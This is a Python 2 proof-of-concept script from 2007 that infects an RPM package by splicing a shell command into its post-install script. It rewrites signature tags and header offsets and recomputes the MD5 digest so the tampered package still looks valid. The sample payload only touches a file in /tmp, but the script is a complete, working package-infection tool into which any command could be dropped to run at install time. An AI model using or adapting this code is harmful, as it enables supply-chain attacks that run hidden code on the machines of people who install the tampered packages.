#!/usr/bin/env python
# devloop 05/2007
# RPM infection PoC - inject code after post-install script
# md5 check seems to be optionnal
import md5
print "######################"
payload=";touch /tmp/stuckhereagain"
payload=payload+(4 - (len(payload) % 4))*" "
print "Payload size is "+str(len(payload))
fd=open("/tmp/netcat-0.7.1-1.i386.rpm","r+")
fd.seek(104)
bytes=fd.read(4)
count=int(bytes.encode("hex"),16)
print "Found "+str(count)+" items in the Signature"
bytes=fd.read(4)
size=int(bytes.encode("hex"),16)
print "Signature store size is "+str(size)
items=[]
for i in range(count):
  bytes=fd.read(16)
  tag=int(bytes[0:4].encode("hex"),16)
  type=int(bytes[4:8].encode("hex"),16)
  offset=int(bytes[8:12].encode("hex"),16)
  mylen=int(bytes[12:16].encode("hex"),16)
  items.append([tag,type,offset,mylen])
for i in range(count):
  if items[i][0]==267 or items[i][0]==269 or items[i][0]>1004:
    items[i][0]=256+items[i][0]
  if items[i][0]==1000:
    offset=items[i][2]
  if items[i][0]==1004:
    md5offset=items[i][2]
md5offset=md5offset+fd.tell()
fd.seek(-count*16,1)
print "Rewriting signature headers"
for i in range(count):
  fd.write(("%04X" % items[i][0]).zfill(8).decode("hex"))
  fd.write(("%04X" % items[i][1]).zfill(8).decode("hex"))
  fd.write(("%04X" % items[i][2]).zfill(8).decode("hex"))
  fd.write(("%04X" % items[i][3]).zfill(8).decode("hex"))
fd.seek(offset,1)
bytes=fd.read(4)
mylen=int(bytes.encode("hex"),16)
print "Length of header + payload is "+str(mylen)
mylen=mylen+len(payload)
print "New size is "+str(mylen)
fd.seek(-4,1)
fd.write(("%04X" % mylen).zfill(8).decode("hex"))
fd.seek(-4,1)
fd.seek(-offset,1)

fd.seek(size,1)
# debut Header struct
startheader=fd.tell()
fd.seek(8,1) #passe le header du Header
bytes=fd.read(4)
count=int(bytes.encode("hex"),16)
print "Found "+str(count)+" items in header"
bytes=fd.read(4)
size=int(bytes.encode("hex"),16)
print "Store size is "+str(size)

items=[]
pioffset=0
for i in range(count):
  bytes=fd.read(16)
  tag=int(bytes[0:4].encode("hex"),16)
  type=int(bytes[4:8].encode("hex"),16)
  offset=int(bytes[8:12].encode("hex"),16)
  mylen=int(bytes[12:16].encode("hex"),16)
  items.append([tag,type,offset,mylen])
  if tag==1024:
    pioffset=offset

print "Post-Installation is at offset "+str(pioffset)
minsupp=size
for i in range(count):
  if items[i][2]<minsupp and items[i][2]>pioffset:
    minsupp=items[i][2]

strlen=minsupp-pioffset

print "Calculating new headers"
for i in range(count):
  if items[i][2]>pioffset:
    items[i][2]=items[i][2]+len(payload)

fd.seek(-count*16,1)
# reecriture size
fd.seek(-4,1)
print "Fixing store size to "+str(size+len(payload))
fd.write(("%04X" % (size+len(payload))).zfill(8).decode("hex"))
# reecriture items
for i in range(count):
  fd.write(("%04X" % items[i][0]).zfill(8).decode("hex"))
  fd.write(("%04X" % items[i][1]).zfill(8).decode("hex"))
  fd.write(("%04X" % items[i][2]).zfill(8).decode("hex"))
  fd.write(("%04X" % items[i][3]).zfill(8).decode("hex"))

fd.flush()
fd.seek(pioffset,1)
fd.seek(strlen-1,1)
# ajout payload
size=len(payload)
mem1=payload

print "Injecting payload"
i=0L
while True:
  mem2=fd.read(size)
  fd.seek(-len(mem2),1)
  fd.write(mem1)
  i=i+1
  mem1=mem2
  if len(mem2)==0:
    break

m=md5.new()
fd.seek(startheader,0)
while True:
  mem1=fd.read(60)
  m.update(mem1)
  if len(mem1)<60:
    break
print "Fixing md5sum to "+m.digest().encode("hex")
fd.seek(md5offset,0)
fd.write(m.digest())
fd.close()
print "Injection done !"
